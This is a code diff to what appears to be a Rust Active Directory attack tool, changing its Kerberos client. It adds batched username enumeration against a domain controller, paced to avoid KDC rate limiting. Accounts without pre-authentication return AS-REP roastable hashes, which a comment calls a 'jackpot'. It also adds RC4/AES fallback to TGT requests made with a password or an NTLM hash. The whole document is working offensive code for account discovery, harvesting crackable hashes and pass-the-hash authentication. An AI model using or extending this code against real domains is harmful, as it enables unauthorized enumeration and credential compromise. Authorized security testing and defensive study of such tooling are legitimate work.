@@ -17,8 +17,7 @@ use kerberos_crypto::new_kerberos_cipher;
 use md5::Md5;
 use std::net::SocketAddr;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
-use tokio::net::TcpStream;
-use tokio::net::UdpSocket;
+use tokio::net::{TcpStream, UdpSocket};
 use tracing::{debug, info, warn};
 
 // ═══════════════════════════════════════════════════════════
@@ -189,19 +188,10 @@ async fn kdc_recv(stream: &mut TcpStream) -> Result<Vec<u8>> {
 /// Connect to KDC, send request, receive response
 /// Tries UDP first for small messages, falls back to TCP on failure.
 async fn kdc_exchange(dc_ip: &str, request_bytes: &[u8]) -> Result<Vec<u8>> {
-    // Try UDP first for small messages (avoids TCP handshake overhead)
-    // Most Kerberos requests fit in a single UDP datagram (< 1400 bytes).
-    if request_bytes.len() < 1400 {
-        match kdc_exchange_udp(dc_ip, request_bytes).await {
-            Ok(data) => return Ok(data),
-            Err(e) => {
-                debug!("UDP KDC exchange failed, falling back to TCP: {e}");
-            }
-        }
-    }
     kdc_exchange_tcp(dc_ip, request_bytes).await
 }
 
+#[allow(dead_code)]
 /// Kerberos exchange over UDP (connectionless, no length prefix)
 async fn kdc_exchange_udp(dc_ip: &str, request_bytes: &[u8]) -> Result<Vec<u8>> {
     let addr: SocketAddr = format!("{dc_ip}:{KDC_PORT}")
@@ -223,11 +213,9 @@ async fn kdc_exchange_udp(dc_ip: &str, request_bytes: &[u8]) -> Result<Vec<u8>> 
         .map_err(|e| OverthroneError::Kerberos(format!("UDP send to KDC failed: {e}")))?;
 
     let mut buf = vec![0u8; 65535];
-    let len = tokio::time::timeout(std::time::Duration::from_secs(5), socket.recv(&mut buf))
+    let len = tokio::time::timeout(std::time::Duration::from_millis(200), socket.recv(&mut buf))
         .await
-        .map_err(|_| {
-            OverthroneError::Kerberos(format!("UDP KDC response timed out after 5s: {addr}"))
-        })?
+        .map_err(|_| OverthroneError::Kerberos("UDP timeout, fallback to TCP".to_string()))?
         .map_err(|e| OverthroneError::Kerberos(format!("UDP recv from KDC failed: {e}")))?;
 
     buf.truncate(len);
@@ -241,20 +229,16 @@ async fn kdc_exchange_tcp(dc_ip: &str, request_bytes: &[u8]) -> Result<Vec<u8>> 
         .map_err(|e| OverthroneError::Kerberos(format!("Invalid KDC address: {e}")))?;
 
     let mut stream =
-        tokio::time::timeout(std::time::Duration::from_secs(10), TcpStream::connect(addr))
+        tokio::time::timeout(std::time::Duration::from_secs(3), TcpStream::connect(addr))
             .await
-            .map_err(|_| {
-                OverthroneError::Kerberos(format!("KDC connection timed out after 10s: {addr}"))
-            })?
+            .map_err(|_| OverthroneError::Kerberos(format!("KDC unreachable: {addr}")))?
             .map_err(|e| OverthroneError::Kerberos(format!("Cannot reach KDC at {addr}: {e}")))?;
 
     debug!("Connected to KDC at {addr}");
     kdc_send(&mut stream, request_bytes).await?;
-    tokio::time::timeout(std::time::Duration::from_secs(15), kdc_recv(&mut stream))
+    tokio::time::timeout(std::time::Duration::from_secs(3), kdc_recv(&mut stream))
         .await
-        .map_err(|_| {
-            OverthroneError::Kerberos(format!("KDC response timed out after 15s: {addr}"))
-        })?
+        .map_err(|_| OverthroneError::Kerberos(format!("KDC no response: {addr}")))?
 }
 
 // ═══════════════════════════════════════════════════════════
@@ -731,7 +715,11 @@ pub async fn user_enum_single(dc_ip: &str, domain: &str, username: &str) -> User
     let realm = normalize_realm(domain);
     let clean_username = normalize_username(username);
 
-    let req_body = build_as_req_body(clean_username, &realm, &[ETYPE_RC4_HMAC]);
+    let req_body = build_as_req_body(
+        clean_username,
+        &realm,
+        &[ETYPE_RC4_HMAC, ETYPE_AES256_CTS, ETYPE_AES128_CTS],
+    );
     let as_req = AsReq {
         pvno: 5,
         msg_type: 10,
@@ -744,14 +732,23 @@ pub async fn user_enum_single(dc_ip: &str, domain: &str, username: &str) -> User
         Err(e) => return UserEnumStatus::Error(e.to_string()),
     };
 
+    parse_user_enum_response(&response_bytes, clean_username.to_string(), domain)
+}
+
+/// Parse a KDC response for user enumeration status.
+fn parse_user_enum_response(
+    response_bytes: &[u8],
+    clean_username: String,
+    domain: &str,
+) -> UserEnumStatus {
     // If we get a valid AS-REP, the user exists AND has no pre-auth — jackpot
-    if let Ok((_, as_rep)) = AsRep::parse(&response_bytes) {
+    if let Ok((_, as_rep)) = AsRep::parse(response_bytes) {
         let enc_part = &as_rep.enc_part;
         let cipher_data = &enc_part.cipher;
         let hash_string =
-            format_asrep_hash_string(enc_part.etype, clean_username, &realm, cipher_data);
+            format_asrep_hash_string(enc_part.etype, &clean_username, domain, cipher_data);
         return UserEnumStatus::ValidNoPreauth(CrackableHash {
-            username: clean_username.to_string(),
+            username: clean_username,
             domain: domain.to_string(),
             spn: None,
             hash_type: HashType::AsRepRoast,
@@ -761,7 +758,7 @@ pub async fn user_enum_single(dc_ip: &str, domain: &str, username: &str) -> User
     }
 
     // Parse KRB-ERROR to determine user existence
-    match KrbError::parse(&response_bytes) {
+    match KrbError::parse(response_bytes) {
         Ok((_, krb_err)) => match krb_err.error_code {
             6 => UserEnumStatus::NotFound,  // KDC_ERR_C_PRINCIPAL_UNKNOWN
             25 => UserEnumStatus::Valid,    // KDC_ERR_PREAUTH_REQUIRED
@@ -775,6 +772,146 @@ pub async fn user_enum_single(dc_ip: &str, domain: &str, username: &str) -> User
     }
 }
 
+/// Batch user enumeration — opens one TCP connection and reuses it for all requests.
+/// Much faster than opening a new TCP connection per user.
+pub async fn user_enum_batch(
+    dc_ip: &str,
+    domain: &str,
+    usernames: &[String],
+) -> Vec<(String, UserEnumStatus)> {
+    let realm = normalize_realm(domain);
+    let addr: SocketAddr = format!("{dc_ip}:{KDC_PORT}").parse().unwrap_or_else(|_| {
+        SocketAddr::new(
+            std::net::IpAddr::V4(std::net::Ipv4Addr::new(127, 0, 0, 1)),
+            KDC_PORT,
+        )
+    });
+
+    let mut results = Vec::with_capacity(usernames.len());
+
+    // Open one TCP connection and reuse it for all requests (longer timeout for first connection)
+    let stream = match tokio::time::timeout(
+        tokio::time::Duration::from_secs(10),
+        TcpStream::connect(addr),
+    )
+    .await
+    {
+        Ok(Ok(s)) => s,
+        _ => {
+            // If TCP connection fails, fall back to individual requests
+            info!("TCP connection failed, falling back to individual connections");
+            for username in usernames {
+                let status = user_enum_single(dc_ip, domain, username).await;
+                results.push((username.clone(), status));
+            }
+            return results;
+        }
+    };
+
+    // Use a mutex to ensure sequential access to the shared stream
+    let stream = std::sync::Arc::new(tokio::sync::Mutex::new(stream));
+
+    // Process all users sequentially over the shared connection
+    // with a 5-user batch reconnect to avoid stale connections
+    for (i, username) in usernames.iter().enumerate() {
+        // Small delay between requests to avoid KDC rate limiting
+        if i > 0 && i % 3 == 0 {
+            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
+        }
+
+        // Reconnect every 15 users to avoid stale connections
+        if i > 0 && i % 15 == 0 {
+            let new_stream = match tokio::time::timeout(
+                tokio::time::Duration::from_secs(5),
+                TcpStream::connect(addr),
+            )
+            .await
+            {
+                Ok(Ok(s)) => s,
+                _ => break,
+            };
+            *stream.lock().await = new_stream;
+        }
+
+        let clean_username = normalize_username(username);
+        let req_body = build_as_req_body(
+            clean_username,
+            &realm,
+            &[ETYPE_RC4_HMAC, ETYPE_AES256_CTS, ETYPE_AES128_CTS],
+        );
+        let as_req = AsReq {
+            pvno: 5,
+            msg_type: 10,
+            padata: Some(vec![build_pa_pac_request(true)]),
+            req_body,
+        };
+        let as_req_bytes = as_req.build();
+
+        // Debug: print first request bytes
+        if i == 0 {
+            debug!(
+                "First AS-REQ ({} bytes): {}",
+                as_req_bytes.len(),
+                hex::encode(&as_req_bytes[..as_req_bytes.len().min(128)])
+            );
+        }
+
+        let status = {
+            let mut stream_guard = stream.lock().await;
+            let send_result = kdc_send(&mut stream_guard, &as_req_bytes).await;
+            if send_result.is_err() {
+                let status = user_enum_single(dc_ip, domain, username).await;
+                results.push((username.clone(), status));
+                for remaining in &usernames[i + 1..] {
+                    let s = user_enum_single(dc_ip, domain, remaining).await;
+                    results.push((remaining.clone(), s));
+                }
+                return results;
+            }
+
+            let response = tokio::time::timeout(
+                tokio::time::Duration::from_secs(3),
+                kdc_recv(&mut stream_guard),
+            )
+            .await;
+
+            match response {
+                Ok(Ok(bytes)) => {
+                    parse_user_enum_response(&bytes, clean_username.to_string(), domain)
+                }
+                _ => {
+                    // Timeout or read error — connection state is lost.
+                    // Reconnect a fresh stream for the next user.
+                    *stream_guard = match tokio::time::timeout(
+                        tokio::time::Duration::from_secs(5),
+                        TcpStream::connect(addr),
+                    )
+                    .await
+                    {
+                        Ok(Ok(s)) => s,
+                        _ => {
+                            // Can't reconnect, fall back to individual connections
+                            drop(stream_guard);
+                            let s = user_enum_single(dc_ip, domain, username).await;
+                            results.push((username.clone(), s));
+                            for remaining in &usernames[i + 1..] {
+                                let s2 = user_enum_single(dc_ip, domain, remaining).await;
+                                results.push((remaining.clone(), s2));
+                            }
+                            return results;
+                        }
+                    };
+                    UserEnumStatus::Error("KDC no response (reconnected)".to_string())
+                }
+            }
+        };
+
+        results.push((username.clone(), status));
+    }
+
+    results
+}
+
 // ═══════════════════════════════════════════════════════════
 //  TGT Request (with pre-authentication)
 // ═══════════════════════════════════════════════════════════
@@ -784,6 +921,10 @@ pub async fn user_enum_single(dc_ip: &str, domain: &str, username: &str) -> User
 /// If the KDC returns KDC_ERR_WRONG_REALM (code 68), the function
 /// automatically follows the referral by resolving the suggested realm's
 /// KDC via DNS SRV and retrying (max 2 hops).
+///
+/// When `use_hash` is false (password auth), tries multiple etypes:
+/// RC4-HMAC first, then AES128, then AES256. This handles accounts
+/// where RC4 is disabled (modern AD defaults).
 pub async fn request_tgt(
     dc_ip: &str,
     domain: &str,
@@ -795,92 +936,142 @@ pub async fn request_tgt(
     let clean_username = normalize_username(username);
     info!("Requesting TGT for {clean_username}@{realm}");
 
-    let (key, etype) = if use_hash {
-        (ntlm::parse_ntlm_hash(secret)?, ETYPE_RC4_HMAC)
+    // Build the list of etypes + keys to try
+    struct EtypeKey {
+        etype: i32,
+        key: Vec<u8>,
+    }
+
+    let attempts: Vec<EtypeKey> = if use_hash {
+        vec![EtypeKey {
+            etype: ETYPE_RC4_HMAC,
+            key: ntlm::parse_ntlm_hash(secret)?,
+        }]
     } else {
-        (ntlm::nt_hash(secret), ETYPE_RC4_HMAC)
+        let nt_key = ntlm::nt_hash(secret);
+        let mut list = vec![EtypeKey {
+            etype: ETYPE_RC4_HMAC,
+            key: nt_key,
+        }];
+        // Derive AES keys from password for fallback
+        let salt = kerberos_crypto::aes_hmac_sha1::generate_salt(&realm, clean_username);
+        if let Ok(aes128_key) = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+            kerberos_crypto::aes_hmac_sha1::generate_key_from_string(
+                secret,
+                &salt,
+                &kerberos_crypto::AesSizes::Aes128,
+            )
+        })) {
+            list.push(EtypeKey {
+                etype: ETYPE_AES128_CTS,
+                key: aes128_key,
+            });
+        }
+        if let Ok(aes256_key) = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+            kerberos_crypto::aes_hmac_sha1::generate_key_from_string(
+                secret,
+                &salt,
+                &kerberos_crypto::AesSizes::Aes256,
+            )
+        })) {
+            list.push(EtypeKey {
+                etype: ETYPE_AES256_CTS,
+                key: aes256_key,
+            });
+        }
+        list
     };
 
+    let all_etypes: Vec<i32> = attempts.iter().map(|a| a.etype).collect();
     let original_dc_ip = dc_ip.to_string();
     let mut current_dc = original_dc_ip.clone();
     let mut current_realm = realm.clone();
+    let mut last_error: Option<OverthroneError> = None;
 
-    for hop in 0..=2 {
-        let pa_timestamp = build_pa_enc_timestamp(&key, etype)?;
-        let pa_pac = build_pa_pac_request(true);
-        let req_body = build_as_req_body(clean_username, &current_realm, &[etype]);
+    'hop: for hop in 0..=2 {
+        for attempt in &attempts {
+            let pa_timestamp = build_pa_enc_timestamp(&attempt.key, attempt.etype)?;
+            let pa_pac = build_pa_pac_request(true);
+            let req_body = build_as_req_body(clean_username, &current_realm, &all_etypes);
 
-        let as_req = AsReq {
-            pvno: 5,
-            msg_type: 10,
-            padata: Some(vec![pa_timestamp, pa_pac]),
-            req_body,
-        };
+            let as_req = AsReq {
+                pvno: 5,
+                msg_type: 10,
+                padata: Some(vec![pa_timestamp, pa_pac]),
+                req_body,
+            };
 
-        let response_bytes = kdc_exchange(&current_dc, &as_req.build()).await?;
+            let response_bytes = match kdc_exchange(&current_dc, &as_req.build()).await {
+                Ok(b) => b,
+                Err(e) => {
+                    debug!("TGT {clean_username}: etype {} failed: {e}", attempt.etype);
+                    continue;
+                }
+            };
 
-        match AsRep::parse(&response_bytes) {
-            Ok((_, as_rep)) => {
-                // Decrypt enc-part to extract session key
-                let cipher = new_kerberos_cipher(etype)
-                    .map_err(|e| OverthroneError::Kerberos(format!("Cipher init: {e}")))?;
+            match AsRep::parse(&response_bytes) {
+                Ok((_, as_rep)) => {
+                    let cipher = new_kerberos_cipher(attempt.etype)
+                        .map_err(|e| OverthroneError::Kerberos(format!("Cipher init: {e}")))?;
 
-                let decrypted = cipher
-                    .decrypt(&key, 3, &as_rep.enc_part.cipher)
-                    .map_err(|e| {
-                        OverthroneError::Kerberos(format!("AS-REP decrypt failed: {e}"))
+                    let decrypted = cipher
+                        .decrypt(&attempt.key, 3, &as_rep.enc_part.cipher)
+                        .map_err(|e| {
+                            OverthroneError::Kerberos(format!("AS-REP decrypt failed: {e}"))
+                        })?;
+
+                    let (_, enc_part) = EncAsRepPart::parse(&decrypted).map_err(|e| {
+                        OverthroneError::Kerberos(format!("Parse EncAsRepPart: {e}"))
                     })?;
 
-                let (_, enc_part) = EncAsRepPart::parse(&decrypted)
-                    .map_err(|e| OverthroneError::Kerberos(format!("Parse EncAsRepPart: {e}")))?;
+                    info!(
+                        "TGT obtained for {username}@{current_realm} (etype: {})",
+                        enc_part.key.keytype
+                    );
 
-                info!(
-                    "TGT obtained for {username}@{current_realm} (etype: {})",
-                    enc_part.key.keytype
-                );
-
-                return Ok(TicketGrantingData {
-                    ticket: as_rep.ticket,
-                    session_key: enc_part.key.keyvalue.clone(),
-                    session_key_etype: enc_part.key.keytype,
-                    client_principal: clean_username.to_string(),
-                    client_realm: current_realm,
-                    end_time: Some(enc_part.endtime),
-                });
-            }
-            Err(_) => {
-                // Check if this is a WRONG_REALM referral
-                if let Some(suggested) = extract_wrong_realm(&response_bytes) {
-                    if hop >= 2 {
-                        return Err(OverthroneError::Kerberos(format!(
-                            "KDC_ERR_WRONG_REALM: exceeded max referral hops (referred to '{suggested}')"
-                        )));
-                    }
-                    info!("KDC referred us to realm '{suggested}' (hop {hop})");
-
-                    // Resolve the new realm's KDC via DNS SRV
-                    match resolve_realm_kdc(&suggested, Some(&original_dc_ip)).await {
-                        Ok(new_dc) => {
-                            current_dc = new_dc;
-                            current_realm = suggested;
-                            continue;
-                        }
-                        Err(e) => {
+                    return Ok(TicketGrantingData {
+                        ticket: as_rep.ticket,
+                        session_key: enc_part.key.keyvalue.clone(),
+                        session_key_etype: enc_part.key.keytype,
+                        client_principal: clean_username.to_string(),
+                        client_realm: current_realm,
+                        end_time: Some(enc_part.endtime),
+                    });
+                }
+                Err(_) => {
+                    if let Some(suggested) = extract_wrong_realm(&response_bytes) {
+                        if hop >= 2 {
                             return Err(OverthroneError::Kerberos(format!(
-                                "KDC_ERR_WRONG_REALM: referred to '{suggested}' but DNS SRV resolution failed: {e}"
+                                "KDC_ERR_WRONG_REALM: exceeded max referral hops (referred to '{suggested}')"
                             )));
                         }
+                        info!("KDC referred us to realm '{suggested}' (hop {hop})");
+                        match resolve_realm_kdc(&suggested, Some(&original_dc_ip)).await {
+                            Ok(new_dc) => {
+                                current_dc = new_dc;
+                                current_realm = suggested;
+                                continue 'hop;
+                            }
+                            Err(e) => {
+                                return Err(OverthroneError::Kerberos(format!(
+                                    "KDC_ERR_WRONG_REALM: referred to '{suggested}' but DNS SRV resolution failed: {e}"
+                                )));
+                            }
+                        }
                     }
+                    // Not a referral — save error and try next etype
+                    last_error = Some(parse_krb_error(&response_bytes));
+                    continue;
                 }
-                // Not a WRONG_REALM — return the original error
-                return Err(parse_krb_error(&response_bytes));
             }
         }
+        // All etypes tried for this DC — stop trying
+        break;
     }
 
-    Err(OverthroneError::Kerberos(
-        "request_tgt: referral loop exhausted".to_string(),
-    ))
+    Err(last_error.unwrap_or_else(|| {
+        OverthroneError::Kerberos("request_tgt: no KDC response for any etype".to_string())
+    }))
 }
 
 /// Options for OPSEC-compliant TGT requests.
